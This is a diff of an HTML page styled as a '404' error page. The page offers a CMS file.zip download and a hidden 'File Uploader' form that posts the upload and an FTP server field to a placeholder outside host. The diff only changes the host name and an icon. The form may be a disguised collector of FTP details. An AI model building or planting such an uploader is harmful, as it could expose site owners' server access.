@@ -4,14 +4,14 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"> 
-<link href="http://yoursite.com/bootstrap.min.css" rel="stylesheet">
+<link href="http://yourhost.com/bootstrap.min.css" rel="stylesheet">
 </head>
 <body>
 <div class="container">
 
 <nav class="navbar navbar-light bg-light">
   <br><br><div class="alert alert-light order-first">
-  <h2><b>&#9785; html 404</b></h3>
+  <h2><b>&#9888; html 404</b></h3>
 </nav></div>
 </div>
 <div class="container">
@@ -30,7 +30,7 @@ You can now use FTP or the file manager in your cPanel to upload your site.</p>
   <center><h5 class="card-header">Step 1</h5></center>
   <div class="card-body">
     <p class="card-text"> 
-<p>Download CMS <a class="btn btn-outline-dark" href="http://yoursite.com/file.zip"><b>file.zip</b></a></p>
+<p>Download CMS <a class="btn btn-outline-dark" href="http://yourhost.com/file.zip"><b>file.zip</b></a></p>
 </div>
   </div>
 </div>
@@ -43,7 +43,7 @@ You can now use FTP or the file manager in your cPanel to upload your site.</p>
   <div class="card-body">
     <p class="card-text"> 
 <p>Upload CMS <b>file.zip</b></p><hr><details><summary class="btn btn-outline-primary">File Uploader</summary><br><br>
-        <form action="http://yoursite.com/upload.php" method="post" enctype="multipart/form-data">
+        <form action="http://yourhost.com/upload.php" method="post" enctype="multipart/form-data">
                 <p><input name="upload" type="file" /></p>
                 
                 <p><input type="text" class="form-control" placeholder="FTP Server" name="ftp" value=""></p>
